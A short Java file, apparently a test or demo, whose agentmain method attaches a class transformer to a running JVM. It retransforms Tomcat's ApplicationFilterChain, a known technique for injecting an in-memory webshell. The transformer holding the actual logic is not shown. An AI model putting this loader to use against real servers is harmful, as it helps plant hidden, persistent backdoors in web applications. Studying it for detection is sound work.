import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class AgentMainTest {
    public static void agentmain(String agentArgs, Instrumentation inst) {


        // 添加类转换器
        inst.addTransformer(new MyTransformer(), true);

        // 遍历所有已加载的类
        for (Class<?> clazz : inst.getAllLoadedClasses()) {
            // 找到目标类并进行重转换
            if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                try {
                    inst.retransformClasses(clazz);
                } catch (UnmodifiableClassException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        System.out.println("success");
    }
}